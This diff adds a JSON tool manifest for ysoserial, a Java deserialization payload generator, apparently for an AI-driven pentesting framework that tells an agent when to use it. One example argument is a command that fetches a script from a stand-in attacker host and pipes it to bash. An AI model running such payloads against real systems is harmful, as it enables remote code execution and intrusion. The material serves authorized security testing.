@@ -1,0 +1,122 @@
+{
+  "id": "ysoserial",
+  "name": "ysoserial",
+  "version": "1.0.0",
+  "category": "exploitation",
+  "description": "Java deserialization payload generator. Produces serialized Java objects that execute commands when deserialized by vulnerable applications. Supports dozens of gadget chains.",
+  "metadata": {
+    "ai_description": "ysoserial is the definitive Java deserialization exploitation tool. Use it when you discover a Java application that accepts serialized objects (e.g., via HTTP parameters, cookies, RMI, JMX). It generates malicious serialized Java objects using known gadget chains (CommonsCollections, Spring, Groovy, etc.) that execute arbitrary commands upon deserialization. The output can be delivered raw, base64-encoded, or hex-encoded depending on the target application.",
+    "capabilities": [
+      "deserialization",
+      "code_execution",
+      "exploit_framework"
+    ],
+    "supported_targets": [
+      "url",
+      "ip",
+      "host"
+    ],
+    "risk_level": "critical",
+    "tags": [
+      "java",
+      "deserialization",
+      "rce",
+      "exploit",
+      "gadget-chain",
+      "payload"
+    ],
+    "use_cases": [
+      "Generating deserialization payloads for vulnerable Java apps",
+      "Testing Java applications for insecure deserialization",
+      "Exploiting known deserialization vulnerabilities (CVE)",
+      "Creating payloads for RMI, JMX, and JNDI injection attacks",
+      "Crafting custom gadget chains for specific library versions"
+    ],
+    "limitations": [
+      "Requires Java Runtime Environment (JRE) to run",
+      "Payloads depend on specific gadget libraries being on the classpath",
+      "Generated payloads are static and need external delivery mechanism",
+      "Antivirus/EDR may detect known ysoserial payloads"
+    ],
+    "complements": [
+      "burp",
+      "nuclei",
+      "metasploit"
+    ],
+    "prerequisites": [
+      "nuclei"
+    ]
+  },
+  "installation": {
+    "method": "binary",
+    "commands": [
+      "mkdir -p /opt/spectra_tools/java",
+      "curl -sL -o /opt/spectra_tools/java/ysoserial-all.jar https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar"
+    ],
+    "verification_command": "test -f /opt/spectra_tools/java/ysoserial-all.jar && echo 'ysoserial ready'",
+    "verification_regex": "ysoserial ready",
+    "uninstall_commands": [
+      "rm -f /opt/spectra_tools/java/ysoserial-all.jar"
+    ]
+  },
+  "execution": {
+    "command": "java",
+    "args_template": "-jar /opt/spectra_tools/java/ysoserial-all.jar {payload_type} '{command}' {flags}",
+    "timeout": 30,
+    "min_timeout": 5,
+    "max_timeout": 60
+  },
+  "parsing": {
+    "format": "raw",
+    "regex_patterns": [
+      {
+        "pattern": "Picked\\s+up\\s+_JAVA_OPTIONS",
+        "type": "info"
+      },
+      {
+        "pattern": "Error\\s+while\\s+generating\\s+or\\s+serializing",
+        "type": "error"
+      }
+    ],
+    "llm_extraction": true,
+    "extraction_hint": "Extract generated payload success, error messages from payload generation, and the raw serialized output for delivery"
+  },
+  "stealth": {
+    "rate_limit": null,
+    "delay_ms": 0,
+    "extra_args": {}
+  },
+  "ui": {
+    "icon": "terminal",
+    "color": "red"
+  },
+  "examples": [
+    {
+      "description": "Generate CommonsCollections1 payload",
+      "args": {
+        "payload_type": "CommonsCollections1",
+        "command": "curl http://attacker.com/shell.sh | bash",
+        "flags": "| base64 -w0"
+      }
+    },
+    {
+      "description": "Generate Spring framework payload",
+      "args": {
+        "payload_type": "Spring1",
+        "command": "id",
+        "flags": "| xxd -p | tr -d '\\n'"
+      }
+    },
+    {
+      "description": "List all available gadget chains",
+      "args": {
+        "payload_type": "",
+        "command": "",
+        "flags": ""
+      }
+    }
+  ],
+  "resources": {
+    "tier": "light"
+  }
+}
